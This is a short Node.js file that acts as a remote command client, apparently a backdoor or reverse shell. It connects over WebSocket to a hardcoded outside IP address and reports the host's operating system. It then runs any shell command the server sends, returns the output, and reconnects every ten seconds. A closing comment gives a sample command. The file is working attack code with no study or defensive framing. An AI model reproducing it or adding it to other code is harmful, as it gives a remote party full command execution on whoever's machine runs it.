const WS = require('ws')
const os = require('os');
const { exec } = require('child_process')
let ws = new WS("ws://20.115.225.169:8080")
let connected = 0

function connect() {
    connected+=1
    ws = new WS("ws://20.115.225.169:8080")
    ws.on("open", () => {
        console.log("Connection establised")
        if (connected < 2){
            ws.send(`Connected to OS :: ${os.type()}`)
        }
        ws.on("message", (message) => {
            const msg = message.toString()
            const [client, operation, ...text] = msg.split(" ")
            if (operation === "$exec") { // checks if there is exec command to execute the cmd.
                cmd(ws, text.join(" "))
            }
        })
    })
    ws.on("error", (error) => {
        console.log("error")
        setTimeout(reconnect, 2000)
    })
    ws.on("close", () => {
        console.log("Connection Closed")
    })

}

function cmd(ws, cmd) {
    exec(cmd, (err, stdout, stderr) => {
        if (err) {
            ws.send(`ERORR ::: ${err}`)
            return
        } else if (stderr) {
            ws.send(`STDERR ::: ${stderr}`)
            return
        }
        ws.send(stdout)
    })
}
// ws.close()
function reconnect() {
    ws.close()
    connect()
}
setInterval(reconnect, 10000)

// 0 $exec cd .. && ls && touch hi.txt << HELLO BROTHER